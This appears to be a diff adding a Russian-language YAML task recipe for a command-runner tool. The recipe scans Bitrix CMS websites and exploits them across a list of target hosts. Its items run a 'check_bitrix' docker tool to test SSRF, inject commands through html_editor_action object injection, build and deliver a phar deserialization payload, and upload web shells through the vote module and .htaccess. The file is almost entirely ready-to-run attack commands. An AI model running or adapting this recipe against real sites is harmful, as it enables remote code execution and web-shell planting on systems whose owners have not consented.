@@ -1,0 +1,55 @@
+description: Сканирует bitrix-сайты и проводит эксплуатацию
+author: vinzekatze
+
+tags:
+  - bitrix scan
+
+arguments:
+  ssrf-url:
+    description: URL для тестирования SSRF (например, коллаборатор)
+  target:
+    multiple: true
+    description: целевые хосты
+  cmd:
+    default: whoami
+    description: внедряемая команда
+
+shell: bash
+
+mode:
+  loop: target
+  format: 
+    target: '{!r}'
+    ssrf-url: '{!r}'
+    cmd: '{!r}'
+
+file_1:
+  path: attcs/web/bitrix/gadgets.php
+  description: gadgets.php
+
+item_1:
+  description: базовое сканирование
+  script: >-
+    docker run --rm check_bitrix -t #target# scan --ssrf_url #ssrf-url#
+  
+item_2:
+  description: RCE html_editor_action
+  script: >-
+    docker run --rm check_bitrix -t #target# object_injection -c #cmd#
+
+item_3:
+  description: RCE vote phar deserialization
+  script: >-
+    php -d phar.readonly=0 #file_1# rce1 system #cmd# ./payload.phar;
+    docker run -v $(pwd):'/temp' --rm check_bitrix -t #target# vote_phar -p /temp/payload.phar;
+    rm ./payload.phar
+
+item_4:
+  description: RCE vote
+  script: >-
+    docker run --rm check_bitrix -t #target# rce_vote --web-shell true
+
+item_5:
+  description: RCE vote using .htaccess
+  script: >-
+    docker run --rm check_bitrix -t #target# vote_htaccess -p shell.html
